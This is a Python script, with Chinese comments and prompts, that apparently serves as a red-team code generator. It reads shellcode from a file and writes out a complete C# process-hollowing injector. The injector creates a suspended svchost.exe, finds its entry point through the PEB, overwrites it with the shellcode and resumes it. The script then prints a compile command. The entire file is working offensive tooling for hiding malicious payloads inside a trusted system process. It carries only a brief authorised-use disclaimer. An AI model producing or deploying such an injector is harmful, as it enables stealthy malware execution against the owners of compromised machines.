#!/usr/bin/env python3
import re
import os
import sys

def parse_shellcode(file_path):
    try:
        with open(file_path, 'r') as f:
            content = f.read()

        # 增强型shellcode解析逻辑
        patterns = [
            (r'byte$$$$ buf = new byte$$\d+$$ {(.*?)}', r'(0x[0-9a-fA-F]{2},\s*)+'),  # C#数组格式
            (r'(\\x[0-9a-fA-F]{2})+', None),  # 十六进制格式
            (r'(0x[0-9a-fA-F]{2},?\s*)+', None)  # 纯十六进制列表
        ]

        for pattern, sub_pattern in patterns:
            match = re.search(pattern, content, re.DOTALL)
            if match:
                hex_str = match.group(1 if sub_pattern else 0)
                if sub_pattern:
                    hex_str = re.sub(sub_pattern, '', hex_str)
                bytes_list = re.findall(r'0x[0-9a-fA-F]{2}', hex_str)
                if bytes_list:
                    return ',\n'.join(bytes_list).replace('0x', '0x')
                
        raise ValueError("无法识别的shellcode格式")
        
    except Exception as e:
        print(f"错误: 解析shellcode文件失败 - {str(e)}")
        sys.exit(1)

def get_input(prompt, default, validator=None):
    while True:
        user_input = input(f"{prompt} (默认: {default}): ").strip()
        if not user_input:
            user_input = default
            
        if validator:
            try:
                validator(user_input)
            except ValueError as e:
                print(f"错误: {str(e)}")
                continue
                
        return user_input

def validate_filename(name):
    if not name:
        raise ValueError("文件名不能为空")
    if '/' in name or '\\' in name:
        raise ValueError("文件名包含非法字符")
    return True

def main():
    print("\n[+] Process Hollowing 代码生成工具（固定注入svchost.exe进程）")
    print("[!] 警告：本工具将生成针对svchost.exe进程的注入代码")

    shellcode_file = get_input(
        "1. 输入shellcode文件路径", 
        "shell.txt",
        lambda x: os.path.exists(x) or (_ for _ in ()).throw(ValueError("文件不存在"))
    )
    
    output_file = get_input(
        "2. 输入输出文件名", 
        "ProcessHollowing.cs",
        validate_filename
    )

    if not output_file.endswith('.cs'):
        output_file += '.cs'

    byte_str = parse_shellcode(shellcode_file)
    
    template = f"""using System;
using System.ComponentModel;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{{
    class Program
    {{
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {{
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }}

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {{
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }}

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {{
            public IntPtr Reserved1;
            public IntPtr PebBaseAddress;
            public IntPtr Reserved2_0;
            public IntPtr Reserved2_1;
            public IntPtr UniqueProcessId;
            public IntPtr Reserved3;
        }}

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        static void Main()
        {{
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            try
            {{
                // 创建挂起的svchost.exe进程
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);

                bool success = CreateProcess(
                    null,
                    @"C:\\Windows\\System32\\svchost.exe",
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0x00000004, // CREATE_SUSPENDED
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi);

                if (!success)
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // 获取进程基本信息
                PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
                uint returnLength = 0;
                int status = NtQueryInformationProcess(
                    pi.hProcess,
                    0,
                    ref pbi,
                    (uint)Marshal.SizeOf(pbi),
                    ref returnLength);

                if (status != 0)
                    throw new Win32Exception(status);

                // 计算PEB偏移量
                IntPtr pebOffset = (IntPtr)(Environment.Is64BitProcess ?
                    (long)pbi.PebBaseAddress + 0x10 :
                    (int)pbi.PebBaseAddress + 0x8);

                byte[] addrBuf = new byte[Environment.Is64BitProcess ? 8 : 4];
                IntPtr bytesRead;

                if (!ReadProcessMemory(
                    pi.hProcess,
                    pebOffset,
                    addrBuf,
                    addrBuf.Length,
                    out bytesRead))
                {{
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }}

                IntPtr imageBase = Environment.Is64BitProcess ?
                    (IntPtr)BitConverter.ToInt64(addrBuf, 0) :
                    (IntPtr)BitConverter.ToInt32(addrBuf, 0);

                // 读取PE头
                byte[] peHeader = new byte[0x200];
                if (!ReadProcessMemory(pi.hProcess, imageBase, peHeader, peHeader.Length, out bytesRead))
                    throw new Win32Exception(Marshal.GetLastWin32Error());

                // 验证PE签名
                if (peHeader[0] != 'M' || peHeader[1] != 'Z')
                    throw new ApplicationException("Invalid PE header");

                // 获取入口点地址
                uint e_lfanew = BitConverter.ToUInt32(peHeader, 0x3C);
                uint entryPointRva = BitConverter.ToUInt32(peHeader, (int)(e_lfanew + 0x28));
                IntPtr entryPointAddress = (IntPtr)((long)imageBase + entryPointRva);

                // 写入shellcode
                byte[] buf = new byte[] {{
                    {byte_str}
                }};

                IntPtr bytesWritten;
                if (!WriteProcessMemory(
                    pi.hProcess,
                    entryPointAddress,
                    buf,
                    buf.Length,
                    out bytesWritten))
                {{
                    throw new Win32Exception(Marshal.GetLastWin32Error());
                }}

                // 恢复线程执行
                uint resumeResult = ResumeThread(pi.hThread);
                if (resumeResult == 0xFFFFFFFF)
                    throw new Win32Exception(Marshal.GetLastWin32Error());
            }}
            catch (Exception ex)
            {{
                Console.WriteLine("错误: {{0}}", ex.Message);
            }}
            finally
            {{
                if (pi.hProcess != IntPtr.Zero)
                    CloseHandle(pi.hProcess);
                if (pi.hThread != IntPtr.Zero)
                    CloseHandle(pi.hThread);
            }}
        }}
    }}
}}"""

    try:
        with open(output_file, 'w') as f:
            f.write(template)
        print(f"\n[+] 成功生成注入代码: {output_file}")
        print("[!] 重要提示：")
        print("    1. 祝您狩猎愉快")
        print("    2. 编译命令：csc /platform:x64 /unsafe /out:Injector.exe {0}".format(output_file))
        print("    3. 本代码仅用于合法授权测试，使用前请确保拥有合法权限")
    except Exception as e:
        print(f"错误: 文件写入失败 - {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
